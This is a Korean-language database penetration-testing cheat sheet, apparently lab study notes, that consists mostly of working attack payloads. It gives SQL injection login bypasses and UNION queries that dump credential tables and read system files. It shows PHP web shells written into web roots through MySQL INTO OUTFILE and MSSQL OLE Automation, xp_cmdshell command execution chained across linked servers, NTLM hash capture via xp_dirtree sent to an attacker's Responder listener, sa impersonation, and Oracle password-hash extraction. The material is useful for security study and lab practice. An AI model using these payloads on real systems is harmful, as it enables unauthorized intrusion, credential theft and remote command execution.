# Database Services - 데이터베이스 보안 테스트 가이드
## 🔐 SQL Injection
- mysql :  AND operator would be evaluated before the OR operator.
```sql
# '으로 테스트 이후 정상 작동 페이로드 찾기
admin'
admin'-- -
admin';-- -
admin'#
admin')-- -
```
```sql
username : admin' or '1'='1
password : password' or '1'='1
```
```sql
' order by 1-- -
' UNION select 1,2,3-- -

# 실제로 printing 되는 column을 찾아야한다.
' UNION select 1,@@version,3,4-- -

' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

' UNION select 1, username, password, 4 from dev.credentials-- -
```
```sql
# FILE privilege
' UNION SELECT 1, user(), 3, 4-- -

' UNION SELECT 1, user, 3, 4 from mysql.user-- -

' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -

' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -

' UNION SELECT 1, LOAD_FILE("/etc/nginx/sites-enabled/default"), 3, 4-- -

' UNION SELECT 1, LOAD_FILE("%WinDir%\System32\Inetsrv\Config\ApplicationHost.config"), 3, 4-- -
```
```sql
# secure_file_priv value is empty, meaning that we can read/write files to any location.
# 500 error가 나오더라도 파일이 업로드 되었을 수 있음.
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

---

## 📊 MySQL

MySQL은 가장 널리 사용되는 오픈소스 관계형 데이터베이스 관리 시스템입니다.  
**기본 포트**: 3306

### default databases
```mysql
mysql
information_schema
performance_schema
sys
```

### 파일 읽기 (Read Files)

시스템 파일에 접근하여 민감한 정보를 획득할 수 있습니다.

```mysql
-- /etc/passwd 파일 읽기
-- FILE 권한이 필요하며, secure_file_priv 설정에 따라 제한될 수 있음
select LOAD_FILE("/etc/passwd");
```

**주요 확인 사항**:
- `FILE` 권한 보유 여부
- `secure_file_priv` 설정값 (파일 접근 경로 제한)

---

### 파일 쓰기 (Write Files)

웹쉘을 업로드하여 원격 명령 실행이 가능합니다.

```mysql
-- 파일 쓰기 권한 확인
-- secure_file_priv가 비어있거나 특정 경로로 설정되어 있는지 확인
show variables like "secure_file_priv";

-- 웹쉘 작성
-- 웹 루트 디렉터리에 PHP 웹쉘 파일 생성
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

**활용 방법**:
1. 웹쉘 업로드 후 `http://target-ip/webshell.php?c=whoami` 형태로 접근
2. `c` 파라미터를 통해 시스템 명령 실행

---

## 🗄️ MSSQL (Microsoft SQL Server)

Microsoft의 상용 관계형 데이터베이스 관리 시스템입니다.  
**기본 포트**: 1433

### 기본 데이터베이스 구조

MSSQL 설치 시 기본으로 생성되는 시스템 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 저장 (모든 데이터베이스의 마스터 정보) |
| `model` | 새 데이터베이스 생성 시 사용되는 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 스케줄 정보 관리 |
| `tempdb` | 임시 데이터 및 임시 객체 저장 (재시작 시 초기화됨) |
| `resource` | 시스템 객체 저장 (숨김 데이터베이스, 직접 접근 불가) |

---

### 데이터베이스 정보 조회

데이터베이스 구조 및 데이터 파악을 위한 기본 쿼리입니다.

```mssql
-- 모든 데이터베이스 목록 조회
-- sysdatabases 시스템 뷰를 통해 서버의 모든 DB 확인
1> SELECT name FROM master.dbo.sysdatabases
2> GO

-- 특정 데이터베이스 선택
-- USE 명령으로 작업 대상 데이터베이스 변경
1> USE htbusers
2> GO

-- 테이블 목록 조회
-- INFORMATION_SCHEMA를 통해 메타데이터 확인
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

-- 테이블 데이터 조회
-- 실제 저장된 데이터 확인
1> SELECT * FROM users
2> go
```

---

### xp_cmdshell을 통한 명령 실행

`xp_cmdshell`은 운영체제 명령을 실행할 수 있는 강력한 저장 프로시저입니다.  
**위험도**: 🔴 매우 높음 (시스템 레벨 명령 실행 가능)

```mssql
-- xp_cmdshell 활성화
-- 기본적으로 보안상 비활성화되어 있으며, sysadmin 권한 필요
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- 명령 실행
-- SQL Server 서비스 계정의 권한으로 OS 명령 실행
EXECUTE xp_cmdshell 'whoami'
GO
```
---

### 파일 읽기 (Read Files)

`OPENROWSET`을 사용하여 시스템 파일을 읽을 수 있습니다.

```mssql
-- BULK 옵션을 사용한 파일 읽기
-- SINGLE_CLOB: 파일 전체를 하나의 텍스트로 읽음
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
---

### 파일 쓰기 (Write Files)

OLE Automation을 이용한 파일 생성 및 웹쉘 업로드가 가능합니다.

```mssql
-- OLE Automation 활성화
-- COM 객체를 통한 파일 시스템 접근 허용
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

-- 웹쉘 파일 작성
-- FileSystemObject를 이용한 파일 생성 및 쓰기
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
---
### MSSQL 서비스 해시 캡처

UNC 경로를 이용하여 MSSQL 서비스 계정의 NTLM 해시를 획득할 수 있습니다.

**공격 시나리오**:
1. 공격자가 Responder 또는 SMB 서버 실행
2. MSSQL에서 공격자의 UNC 경로 접근 시도
3. 인증 과정에서 NTLM 해시 캡처
4. 캡처한 해시로 크래킹 또는 Pass-the-Hash 공격

```bash
# Responder를 이용한 해시 캡처
# 네트워크 인터페이스(tun0)에서 대기
sudo responder -I tun0 -v

# 또는 Impacket SMB 서버 실행
# SMB2 지원 및 현재 디렉터리를 공유
sudo impacket-smbserver share ./ -smb2support
```

```mssql
-- UNC 경로 접근을 통한 해시 캡처
-- xp_dirtree: 디렉터리 구조 탐색 (인증 발생)
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

-- xp_subdirs: 하위 디렉터리 조회 (인증 발생)
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```
---

### 사용자 권한 상승 (Impersonation)

`IMPERSONATE` 권한을 이용하여 다른 사용자로 권한을 전환할 수 있습니다.

**개념**: 현재 사용자가 다른 사용자의 권한으로 작업을 수행할 수 있는 기능

```mssql
-- Impersonate 가능한 사용자 확인
-- server_permissions와 server_principals 조인하여 확인
SELECT distinct b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE'
6> GO

-- 현재 사용자 및 권한 확인
-- SYSTEM_USER: 현재 로그인 사용자
-- IS_SRVROLEMEMBER('sysadmin'): sysadmin 권한 여부 (1=있음, 0=없음)
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-- sa 계정으로 권한 전환
-- sa: SQL Server의 최고 관리자 계정
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
---

### 연결된 데이터베이스 서버 활용 (Linked Servers)

Linked Server를 통해 다른 데이터베이스 서버와 통신할 수 있습니다.

**개념**: 한 MSSQL 서버에서 다른 데이터베이스 서버의 데이터에 접근하는 기능

```mssql
-- 연결된 서버 목록 조회
-- isremote = 0: linked server를 의미
1> SELECT srvname, isremote FROM sysservers
2> GO

-- 원격 서버에서 명령 실행
-- EXECUTE('query') AT [서버명] 구문 사용
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

-- 원격 서버에서 xp_cmdshell 활성화 및 실행
-- Linked Server를 통한 명령 실행 체이닝
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

-- 원격 서버에서 OS 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]

-- 원격 서버의 파일 읽기
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```
---

## 🏛️ Oracle TNS (Transparent Network Substrate)

Oracle Database의 네트워크 통신 프로토콜입니다.  
**기본 포트**: 1521

### ODAT 도구 사용

ODAT(Oracle Database Attacking Tool)은 Oracle 데이터베이스 보안 평가를 위한 종합 도구입니다.

```bash
# 모든 Oracle 취약점 자동 테스트
# SID, 계정, 권한 상승, 파일 업로드 등 모든 기능 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
# Oracle 클라이언트 라이브러리 경로를 시스템에 등록
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```
---

### SQLPlus를 통한 연결

SQLPlus는 Oracle의 공식 명령줄 클라이언트입니다.

```bash
# 일반 사용자로 연결
# scott/tiger: Oracle의 기본 테스트 계정
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결 (관리자 권한)
# as sysdba: 데이터베이스 관리자 권한으로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```
---

### 파일 업로드 (웹쉘)

`utlfile` 패키지를 이용한 웹쉘 업로드입니다.

```bash
# 웹 디렉터리에 파일 업로드
# --sysdba: SYSDBA 권한으로 실행
# --putFile: 로컬 파일을 원격 서버로 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
---

### 유용한 SQL 쿼리

데이터베이스 정보 수집 및 권한 확인을 위한 쿼리입니다.

```sql
-- 모든 테이블 조회
-- all_tables: 현재 사용자가 접근 가능한 모든 테이블
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
-- user_role_privs: 사용자에게 부여된 역할 및 권한
SELECT * FROM user_role_privs;

-- 사용자 계정 및 비밀번호 해시 조회
-- sys.user$: 시스템 사용자 정보 (DBA 권한 필요)
SELECT name, password FROM sys.user$;
```
